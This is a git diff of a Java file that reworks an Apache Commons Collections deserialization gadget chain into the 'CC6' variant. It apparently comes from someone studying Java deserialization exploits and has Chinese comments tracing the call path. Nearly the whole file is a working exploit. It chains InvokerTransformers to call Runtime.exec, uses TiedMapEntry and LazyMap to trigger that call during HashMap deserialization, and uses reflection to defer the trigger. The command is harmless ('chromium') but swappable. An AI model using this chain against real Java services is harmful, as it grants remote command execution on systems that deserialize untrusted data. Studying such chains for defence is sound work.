@@ -4,15 +4,14 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import toolkit.Seriliazation;
 
 import java.io.IOException;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Map;
 
 /**
@@ -21,49 +20,52 @@ import java.util.Map;
 public class CC6Chain {
     private static String injectedCmd = "chromium";
 
-    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException {
         cc6();
     }
 
-    public static void cc6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+    /**
+     * Hashmap.readObject()
+     *  -> hash(key)
+     *      => HashMap.hash()
+     *          -> key.hashCode() 把这个 key 变成一个 TiedMapEntry
+     *          => TiedMapEntry.hashCode()
+     *              -> TiedMapEntry.getValue()
+     *                  -> map.get(key) 把这个 map 变成 lazymap
+     *                  => LazyMap.get()
+     */
+    public static void cc6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {
         Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd})
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd}),
+                new ConstantTransformer(new HashSet<String>())
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 
-        // 使用 LazyMap，不用 TransformedMap
-        /**
-         * AnnotationInvocationHandler.readObject()
-         *      -> Map(proxy).entrySet()
-         *          -> AnnotationInvocationHandler.invoke()
-         *              -> LazyMap.get()
-         *                  -> factory.transform(key) (protected final Transformer factory)
-         */
-
+        // 创建一个序列化对象
+        HashMap hashMap = new HashMap();
         // 构造一个 LazyMap
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
+        HashMap innerMap = new HashMap();
+        // 使用 ConstantTransformer 防止在 put 的时候就触发
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, new ConstantTransformer(1));
 
-        // 构造一个代理
-        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
-        Class clazzAIHandler = Class.forName(entryClass);
+        // 创造完 TiedMapEntry 之后，lazyMap 和 tiedKey 就绑定了
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "tiedKey");
+        hashMap.put(tiedMapEntry, "aaa");
+        // hashmap.put 之后，会触发 lazyMap 的 get innerMap 会被放进去 tieKey -> 1
+        // 反序列化的时候会再次调用 tiedMapEntry.hashCode()，会再次 get(key="tiedMap")，如果不存在就会走 Transformer
+        innerMap.remove("tiedKey");
 
-        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
-        constructorAIHandler.setAccessible(true);
+        // 重新赋值
+        Class clazz_lazyMap = LazyMap.class;
+        Field fieldFactory = clazz_lazyMap.getDeclaredField("factory");
+        fieldFactory.setAccessible(true);
+        fieldFactory.set(lazyMap, chainedTransformer);
 
-        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
-        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);
-
-        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
-        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, AIHandler);
-
-        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
-        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);
-
-        Seriliazation.serialize(h);
+        Seriliazation.serialize(hashMap);
         Seriliazation.unserialize("ser.bin");
     }
 }
